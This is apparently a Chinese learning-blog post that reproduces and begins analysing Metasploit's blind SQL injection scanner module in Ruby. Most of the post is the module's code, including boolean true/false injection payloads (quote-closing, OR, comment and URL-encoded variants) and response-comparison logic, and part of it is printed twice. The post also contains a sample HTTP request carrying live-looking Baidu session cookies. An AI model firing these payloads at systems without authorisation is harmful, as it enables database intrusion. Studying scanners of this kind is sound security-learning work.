一个高尚的人，一个纯粹的人，一个有道德的人，一个脱离了低级趣味的人，一个有益于人民的人。

------

今天是5月24日，上次更新已经是12天前了，我是一个记忆很差的人，so，，，，，之前写的都忘了。

想了想，竟不知从何开写。![](https://raw.githubusercontent.com/icnshark/photo/main/20210524140056.png)

算了，随便找一个开写吧。

blind_sql_query.rb

![](https://raw.githubusercontent.com/icnshark/photo/main/20210524153000.png)

看名字貌似是一个sql盲注的东西。

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##





class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::WmapScanUniqueQuery
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report


  def initialize(info = {})
    super(update_info(info,
      'Name'   		=> 'HTTP Blind SQL Injection Scanner',
      'Description'	=> %q{
        This module identifies the existence of Blind SQL injection issues
        in GET/POST Query parameters values.
      },
      'Author' 		=> [ 'et [at] cyberspace.org' ],
      'License'		=> BSD_LICENSE))

    register_options(
      [
        OptEnum.new('METHOD', [true, 'HTTP Method', 'GET', ['GET', 'POST'] ]),
        OptString.new('PATH', [ true,  "The path/file to test SQL injection", '/index.asp']),
        OptString.new('QUERY', [ false,  "HTTP URI Query", '']),
        OptString.new('DATA', [ false, "HTTP Body Data", '']),
        OptString.new('COOKIE',[ false, "HTTP Cookies", ''])
      ])

  end

  def run_host(ip)
    # Force http verb to be upper-case, because otherwise some web servers such as
    # Apache might throw you a 501
    http_method = datastore['METHOD'].upcase

    gvars = Hash.new()
    pvars = Hash.new()
    cvars = Hash.new()

    rnum=rand(10000)

    inivalstr = [
      [ 'numeric',
      " AND #{rnum}=#{rnum} ",
      " AND #{rnum}=#{rnum+1} "
      ],
      [ 'single quotes',
      "' AND '#{rnum}'='#{rnum}",
      "' AND '#{rnum}'='#{rnum+1}"
      ],
      [ 'double quotes',
      "\" AND \"#{rnum}\"=\"#{rnum}",
      "\" AND \"#{rnum}\"=\"#{rnum+1}"
      ],
      [ 'OR single quotes uncommented',
      "' OR '#{rnum}'='#{rnum}",
      "' OR '#{rnum}'='#{rnum+1}"
      ],
      [ 'OR single quotes closed and commented',
      "' OR '#{rnum}'='#{rnum}'--",
      "' OR '#{rnum}'='#{rnum+1}'--"
      ],
      [ 'hex encoded OR single quotes uncommented',
      "'%20OR%20'#{rnum}'%3D'#{rnum}",
      "'%20OR%20'#{rnum}'%3D'#{rnum+1}"
      ],
      [ 'hex encoded OR single quotes closed and commented',
      "'%20OR%20'#{rnum}'%3D'#{rnum}'--",
      "'%20OR%20'#{rnum}'%3D'#{rnum+1}'--"
      ]
    ]

    # Creating strings with true and false values
    valstr = []
    inivalstr.each do |vstr|
      # With true values
      valstr << vstr
      # With false values, appending 'x' to real value
      valstr << ['False char '+vstr[0],'x'+vstr[1],'x'+vstr[2]]
      # With false values, appending '0' to real value
      valstr << ['False num '+vstr[0],'0'+vstr[1],'0'+vstr[2]]
    end

    #valstr.each do |v|
    #	print_status("#{v[0]}")
    #	print_status("#{v[1]}")
    #	print_status("#{v[2]}")
    #end

    #
    # Dealing with empty query/data and making them hashes.
    #

    if  !datastore['QUERY'] or datastore['QUERY'].empty?
      datastore['QUERY'] = nil
      gvars = nil
    else
      gvars = queryparse(datastore['QUERY']) #Now its a Hash
    end

    if  !datastore['DATA'] or datastore['DATA'].empty?
      datastore['DATA'] = nil
      pvars = nil
    else
      pvars = queryparse(datastore['DATA'])
    end

    if  !datastore['COOKIE'] or datastore['COOKIE'].empty?
      datastore['COOKIE'] = nil
      cvars = nil
    else
      cvars = queryparse(datastore['COOKIE'])
    end

    verifynr=2

    i=0
    k=0
    c=0

    normalres = nil

    verifynr.times do |j|
    #SEND NORMAL REQUEST
      begin
        normalres = send_request_cgi({
          'uri'  		=> normalize_uri(datastore['PATH']),
          'vars_get' 	=> gvars,
          'method'   	=> http_method,
          'ctype'		=> 'application/x-www-form-urlencoded',
          'cookie'    => datastore['COOKIE'],
          'data'      => datastore['DATA']
        }, 20)
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      rescue ::Timeout::Error, ::Errno::EPIPE
      end

      if not normalres
        print_error("No response")
        return
      else
        if i==0
          k = normalres.body.length
          c = normalres.code.to_i
        else
          if k != normalres.body.length
            print_error("Normal response body vary")
            return
          end
          if c != normalres.code.to_i
            print_error("Normal response code vary")
            return
          end
        end
      end
    end

    print_status("[Normal response body: #{k}  code: #{c}]")

    pinj = false

    valstr.each do |tarr|
      #QUERY
      if gvars
        gvars.each do |key,value|
          vprint_status("- Testing '#{tarr[0]}' Parameter #{key}:")

          #SEND TRUE REQUEST
          testgvars = queryparse(datastore['QUERY']) #Now its a Hash
          testgvars[key] = testgvars[key]+tarr[1]
          t = testgvars[key]

          begin
            trueres = send_request_cgi({
              'uri'  		=>  normalize_uri(datastore['PATH']),
              'vars_get' 	=>  testgvars,
              'method'   	=>  http_method,
              'ctype'		=> 'application/x-www-form-urlencoded',
              'cookie'    => datastore['COOKIE'],
              'data'      => datastore['DATA']
            }, 20)
          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
          rescue ::Timeout::Error, ::Errno::EPIPE
          end

          #SEND FALSE REQUEST
          testgvars = queryparse(datastore['QUERY']) #Now its a Hash
          testgvars[key] = testgvars[key]+tarr[2]

          begin
            falseres = send_request_cgi({
              'uri'  		=>  normalize_uri(datastore['PATH']),
              'vars_get' 	=>  testgvars,
              'method'   	=>  http_method,
              'ctype'		=> 'application/x-www-form-urlencoded',
              'cookie'    => datastore['COOKIE'],
              'data'      => datastore['DATA']
            }, 20)
          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
          rescue ::Timeout::Error, ::Errno::EPIPE
          end

          pinja = false
          pinjb = false
          pinjc = false
          pinjd = false

          pinja = detection_a(normalres,trueres,falseres,tarr)
          pinjb = detection_b(normalres,trueres,falseres,tarr)
          pinjc = detection_c(normalres,trueres,falseres,tarr)
          pinjd = detection_d(normalres,trueres,falseres,tarr)

          if pinja or pinjb or pinjc  or pinjd
            print_good("Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
            print_good("[#{t}]")

            report_web_vuln(
              :host	=> ip,
              :port	=> rport,
              :vhost  => vhost,
              :ssl    => ssl,
              :path	=> normalize_uri(datastore['PATH']),
              :method => http_method,
              :pname  => key,
              :proof  => "blind sql inj.",
              :risk   => 2,
              :confidence   => 50,
              :category     => 'SQL injection',
              :description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
              :name   => 'Blind SQL injection'
            )
          else
            vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
          end
        end
      end

      #DATA
      if pvars
        pvars.each do |key,value|
          print_status("- Testing '#{tarr[0]}' Parameter #{key}:")

          #SEND TRUE REQUEST
          testpvars = queryparse(datastore['DATA']) #Now its a Hash
          testpvars[key] = testpvars[key]+tarr[1]
          t = testpvars[key]

          pvarstr = ""
          testpvars.each do |tkey,tvalue|
            if pvarstr
              pvarstr << '&'
            end
            pvarstr << tkey+'='+tvalue
          end

          begin
            trueres = send_request_cgi({
              'uri'  		=>  normalize_uri(datastore['PATH']),
              'vars_get' 	=>  gvars,
              'method'   	=>  http_method,
              'ctype'		=> 'application/x-www-form-urlencoded',
              'cookie'    => datastore['COOKIE'],
              'data'      => pvarstr
            }, 20)
          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
          rescue ::Timeout::Error, ::Errno::EPIPE
          end

          #SEND FALSE REQUEST
          testpvars = queryparse(datastore['DATA']) #Now its a Hash
          testpvars[key] = testpvars[key]+tarr[2]

          pvarstr = ""
          testpvars.each do |tkey,tvalue|
            if pvarstr
              pvarstr << '&'
            end
            pvarstr << tkey+'='+tvalue
          end

          begin
            falseres = send_request_cgi({
              'uri'  		=>  normalize_uri(datastore['PATH']),
              'vars_get' 	=>  gvars,
              'method'   	=>  http_method,
              'ctype'		=> 'application/x-www-form-urlencoded',
              'cookie'    => datastore['COOKIE'],
              'data'      => pvarstr
            }, 20)
          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
          rescue ::Timeout::Error, ::Errno::EPIPE
          end

          pinja = false
          pinjb = false
          pinjc = false
          pinjd = false

          pinja = detection_a(normalres,trueres,falseres,tarr)
          pinjb = detection_b(normalres,trueres,falseres,tarr)
          pinjc = detection_c(normalres,trueres,falseres,tarr)
          pinjd = detection_d(normalres,trueres,falseres,tarr)

          if pinja or pinjb or pinjc or pinjd
            print_good("Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
            print_good("[#{t}]")

            report_web_vuln(
              :host	=> ip,
              :port	=> rport,
              :vhost  => vhost,
              :ssl    => ssl,
              :path	=> datastore['PATH'],
              :method => http_method,
              :pname  => key,
              :proof  => "blind sql inj.",
              :risk   => 2,
              :confidence   => 50,
              :category     => 'SQL injection',
              :description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
              :name   => 'Blind SQL injection'
            )
          else
            vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
          end
        end
      end
    end
  end

  def detection_a(normalr,truer,falser,tarr)
    # print_status("A")

    # DETECTION A
    # Very simple way to compare responses, this can be improved alot , at this time just the simple way

    if normalr and truer
      #Very simple way to compare responses, this can be improved alot , at this time just the simple way
      reltruesize = truer.body.length-(truer.body.scan(/#{tarr[1]}/).length*tarr[1].length)
      normalsize = normalr.body.length

      #print_status("normalsize #{normalsize} truesize #{reltruesize}")

      if reltruesize == normalsize
        if falser
          relfalsesize = falser.body.length-(falser.body.scan(/#{tarr[2]}/).length*tarr[2].length)

          #print_status("falsesize #{relfalsesize}")

          if reltruesize > relfalsesize
            print_status("Detected by test A")
            return true
          else
            return false
          end
        else
          vprint_status("NO False Response.")
        end
      else
        vprint_status("Normal and True requests are different.")
      end
    else
      print_status("No response.")
    end

    return false
  end

  def detection_b(normalr,truer,falser,tarr)
    # print_status("B")

    # DETECTION B
    # Variance on res body

    if normalr and truer
      if falser
        #print_status("N: #{normalr.body.length} T: #{truer.body.length} F: #{falser.body.length} T1: #{tarr[1].length}  F2: #{tarr[2].length} #{tarr[1].length+tarr[2].length}")

        if (truer.body.length-tarr[1].length) != normalr.body.length and (falser.body.length-tarr[2].length) == normalr.body.length
          print_status("Detected by test B")
          return true
        end
        if (truer.body.length-tarr[1].length) == normalr.body.length and (falser.body.length-tarr[2].length) != normalr.body.length
          print_status("Detected by test B")
          return true
        end
      end
    end

    return false
  end

  def detection_c(normalr,truer,falser,tarr)
    # print_status("C")

    # DETECTION C
    # Variance on res code of true or false statements

    if normalr and truer
      if falser
        if truer.code.to_i != normalr.code.to_i and falser.code.to_i == normalr.code.to_i
          print_status("Detected by test C")
          return true
        end
        if truer.code.to_i == normalr.code.to_i and falser.code.to_i != normalr.code.to_i
          print_status("Detected by test C")
          return true
        end
      end
    end

    return false
  end

  def detection_d(normalr,truer,falser,tarr)
    # print_status("D")

    # DETECTION D
    # Variance PERCENTAGE MIN MAX on res body

    # 2% 50%
    max_diff_perc = 2
    min_diff_perc = 50

    if normalr and truer
      if falser
        nl= normalr.body.length
        tl= truer.body.length
        fl= falser.body.length

        if nl == 0
          nl = 1
        end
        if tl == 0
          tl = 1
        end
        if fl == 0
          fl = 1
        end

        ntmax = [ nl,tl ].max
        ntmin = [ nl,tl ].min
        diff_nt_perc = ((ntmax - ntmin)*100)/(ntmax)
        diff_nt_f_perc = ((ntmax - fl)*100)/(ntmax)

        if diff_nt_perc <= max_diff_perc and diff_nt_f_perc > min_diff_perc
          print_status("Detected by test D")
          return true
        end

        nfmax = [ nl,fl ].max
        nfmin = [ nl,fl ].min
        diff_nf_perc = ((nfmax - nfmin)*100)/(nfmax)
        diff_nf_t_perc = ((nfmax - tl)*100)/(nfmax)

        if diff_nf_perc <= max_diff_perc and diff_nf_t_perc > min_diff_perc
          print_status("Detected by test D")
          return true
        end
      end
    end

    return false
  end
end

```

。。。感觉好长啊，突然想换一个，又懒得换。还是慢慢看看代码吧，也不知道能不能看懂。

查看注释可得知，注入方式是GET或者POST。

![](https://raw.githubusercontent.com/icnshark/photo/main/20210524153647.png)

有5个yes，关注2个重点。

METHOD	方法	GET or POST，没有Cookie。

PATH	路径	注入点



访问baidu的http请求

```http
GET / HTTP/1.1
Host: www.baidu.com
Cookie: BIDUPSID=17D40328B34E2CDC46E583CE51BABDB0; PSTM=1621574852; BAIDUID=17D40328B34E2CDC6B6DC9ABE54827F3:FG=1; BD_UPN=123253; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; __yjs_duid=1_8a4dae3a4b02ad74d0c792e213ba8f651621592698075; H_PS_PSSID=33839_33969_31253_34004_33773_33607_26350_34021; BAIDUID_BFESS=17D40328B34E2CDC6B6DC9ABE54827F3:FG=1; BD_HOME=1; delPer=0; BD_CK_SAM=1; PSINO=2; H_PS_645EC=d370U%2BsH%2B44Exq%2BsRaMS16oc4MaUJDtC3ehpxcUNWPKoRvyFuGk1sCyqKus; COOKIE_SESSION=1762_0_5_0_22_0_1_0_5_0_0_0_1741_0_1_0_1621844490_0_1621844491%7C6%230_0_1621844491%7C1; BA_HECTOR=2la08l802ka5ahah2j1gamopb0q
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
Sec-Ch-Ua-Mobile: ?0
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Purpose: prefetch
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

其实get和post只是传递参数的不同方式，连cookie也一样，主要是看后端如何来处理这些变量，处理不当的话都会造成注入。

EX:UA,XFF等等，只要后端带入数据库查询就都有可能产生注入。

------

现在来分析分析代码，hhh。

```ruby
def run_host(ip)
    # Force http verb to be upper-case, because otherwise some web servers such as
    # Apache might throw you a 501
    http_method = datastore['METHOD'].upcase

    gvars = Hash.new()
    pvars = Hash.new()
    cvars = Hash.new()

    rnum=rand(10000)

    inivalstr = [
      [ 'numeric',
      " AND #{rnum}=#{rnum} ",
      " AND #{rnum}=#{rnum+1} "
      ],
      [ 'single quotes',
      "' AND '#{rnum}'='#{rnum}",
      "' AND '#{rnum}'='#{rnum+1}"
      ],
      [ 'double quotes',
      "\" AND \"#{rnum}\"=\"#{rnum}",
      "\" AND \"#{rnum}\"=\"#{rnum+1}"
      ],
      [ 'OR single quotes uncommented',
      "' OR '#{rnum}'='#{rnum}",
      "' OR '#{rnum}'='#{rnum+1}"
      ],
      [ 'OR single quotes closed and commented',
      "' OR '#{rnum}'='#{rnum}'--",
      "' OR '#{rnum}'='#{rnum+1}'--"
      ],
      [ 'hex encoded OR single quotes uncommented',
      "'%20OR%20'#{rnum}'%3D'#{rnum}",
      "'%20OR%20'#{rnum}'%3D'#{rnum+1}"
      ],
      [ 'hex encoded OR single quotes closed and commented',
      "'%20OR%20'#{rnum}'%3D'#{rnum}'--",
      "'%20OR%20'#{rnum}'%3D'#{rnum+1}'--"
      ]
    ]

    # Creating strings with true and false values
    valstr = []
    inivalstr.each do |vstr|
      # With true values
      valstr << vstr
      # With false values, appending 'x' to real value
      valstr << ['False char '+vstr[0],'x'+vstr[1],'x'+vstr[2]]
      # With false values, appending '0' to real value
      valstr << ['False num '+vstr[0],'0'+vstr[1],'0'+vstr[2]]
    end

    #valstr.each do |v|
    #	print_status("#{v[0]}")
    #	print_status("#{v[1]}")
    #	print_status("#{v[2]}")
    #end

    #
    # Dealing with empty query/data and making them hashes.
    #

    if  !datastore['QUERY'] or datastore['QUERY'].empty?
      datastore['QUERY'] = nil
      gvars = nil
    else
      gvars = queryparse(datastore['QUERY']) #Now its a Hash
    end

    if  !datastore['DATA'] or datastore['DATA'].empty?
      datastore['DATA'] = nil
      pvars = nil
    else
      pvars = queryparse(datastore['DATA'])
    end

    if  !datastore['COOKIE'] or datastore['COOKIE'].empty?
      datastore['COOKIE'] = nil
      cvars = nil
    else
      cvars = queryparse(datastore['COOKIE'])
    end

    verifynr=2

    i=0
    k=0
    c=0

    normalres = nil

    verifynr.times do |j|
    #SEND NORMAL REQUEST
      begin
        normalres = send_request_cgi({
          'uri'  		=> normalize_uri(datastore['PATH']),
          'vars_get' 	=> gvars,
          'method'   	=> http_method,
          'ctype'		=> 'application/x-www-form-urlencoded',
          'cookie'    => datastore['COOKIE'],
          'data'      => datastore['DATA']
        }, 20)
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      rescue ::Timeout::Error, ::Errno::EPIPE
      end

      if not normalres
        print_error("No response")
        return
      else
        if i==0
          k = normalres.body.length
          c = normalres.code.to_i
        else
          if k != normalres.body.length
            print_error("Normal response body vary")
            return
          end
          if c != normalres.code.to_i
            print_error("Normal response code vary")
            return
          end
        end
      end
    end

    print_status("[Normal response body: #{k}  code: #{c}]")

    pinj = false

    valstr.each do |tarr|
      #QUERY
      if gvars
        gvars.each do |key,value|
          vprint_status("- Testing '#{tarr[0]}' Parameter #{key}:")

          #SEND TRUE REQUEST
          testgvars = queryparse(datastore['QUERY']) #Now its a Hash
          testgvars[key] = testgvars[key]+tarr[1]
          t = testgvars[key]

          begin
            trueres = send_request_cgi({
              'uri'  		=>  normalize_uri(datastore['PATH']),
              'vars_get' 	=>  testgvars,
              'method'   	=>  http_method,
              'ctype'		=> 'application/x-www-form-urlencoded',
              'cookie'    => datastore['COOKIE'],
              'data'      => datastore['DATA']
            }, 20)
          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
          rescue ::Timeout::Error, ::Errno::EPIPE
          end

          #SEND FALSE REQUEST
          testgvars = queryparse(datastore['QUERY']) #Now its a Hash
          testgvars[key] = testgvars[key]+tarr[2]

          begin
            falseres = send_request_cgi({
              'uri'  		=>  normalize_uri(datastore['PATH']),
              'vars_get' 	=>  testgvars,
              'method'   	=>  http_method,
              'ctype'		=> 'application/x-www-form-urlencoded',
              'cookie'    => datastore['COOKIE'],
              'data'      => datastore['DATA']
            }, 20)
          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
          rescue ::Timeout::Error, ::Errno::EPIPE
          end

          pinja = false
          pinjb = false
          pinjc = false
          pinjd = false

          pinja = detection_a(normalres,trueres,falseres,tarr)
          pinjb = detection_b(normalres,trueres,falseres,tarr)
          pinjc = detection_c(normalres,trueres,falseres,tarr)
          pinjd = detection_d(normalres,trueres,falseres,tarr)

          if pinja or pinjb or pinjc  or pinjd
            print_good("Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
            print_good("[#{t}]")

            report_web_vuln(
              :host	=> ip,
              :port	=> rport,
              :vhost  => vhost,
              :ssl    => ssl,
              :path	=> normalize_uri(datastore['PATH']),
              :method => http_method,
              :pname  => key,
              :proof  => "blind sql inj.",
              :risk   => 2,
              :confidence   => 50,
              :category     => 'SQL injection',
              :description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
              :name   => 'Blind SQL injection'
            )
          else
            vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
          end
        end
      end

      #DATA
      if pvars
        pvars.each do |key,value|
          print_status("- Testing '#{tarr[0]}' Parameter #{key}:")

          #SEND TRUE REQUEST
          testpvars = queryparse(datastore['DATA']) #Now its a Hash
          testpvars[key] = testpvars[key]+tarr[1]
          t = testpvars[key]

          pvarstr = ""
          testpvars.each do |tkey,tvalue|
            if pvarstr
              pvarstr << '&'
            end
            pvarstr << tkey+'='+tvalue
          end

          begin
            trueres = send_request_cgi({
              'uri'  		=>  normalize_uri(datastore['PATH']),
              'vars_get' 	=>  gvars,
              'method'   	=>  http_method,
              'ctype'		=> 'application/x-www-form-urlencoded',
              'cookie'    => datastore['COOKIE'],
              'data'      => pvarstr
            }, 20)
          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
          rescue ::Timeout::Error, ::Errno::EPIPE
          end

          #SEND FALSE REQUEST
          testpvars = queryparse(datastore['DATA']) #Now its a Hash
          testpvars[key] = testpvars[key]+tarr[2]

          pvarstr = ""
          testpvars.each do |tkey,tvalue|
            if pvarstr
              pvarstr << '&'
            end
            pvarstr << tkey+'='+tvalue
          end

          begin
            falseres = send_request_cgi({
              'uri'  		=>  normalize_uri(datastore['PATH']),
              'vars_get' 	=>  gvars,
              'method'   	=>  http_method,
              'ctype'		=> 'application/x-www-form-urlencoded',
              'cookie'    => datastore['COOKIE'],
              'data'      => pvarstr
            }, 20)
          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
          rescue ::Timeout::Error, ::Errno::EPIPE
          end

          pinja = false
          pinjb = false
          pinjc = false
          pinjd = false

          pinja = detection_a(normalres,trueres,falseres,tarr)
          pinjb = detection_b(normalres,trueres,falseres,tarr)
          pinjc = detection_c(normalres,trueres,falseres,tarr)
          pinjd = detection_d(normalres,trueres,falseres,tarr)

          if pinja or pinjb or pinjc or pinjd
            print_good("Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
            print_good("[#{t}]")

            report_web_vuln(
              :host	=> ip,
              :port	=> rport,
              :vhost  => vhost,
              :ssl    => ssl,
              :path	=> datastore['PATH'],
              :method => http_method,
              :pname  => key,
              :proof  => "blind sql inj.",
              :risk   => 2,
              :confidence   => 50,
              :category     => 'SQL injection',
              :description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
              :name   => 'Blind SQL injection'
            )
          else
            vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
          end
        end
      end
    end
  end
```

脑瓜子疼，明天再继续写。









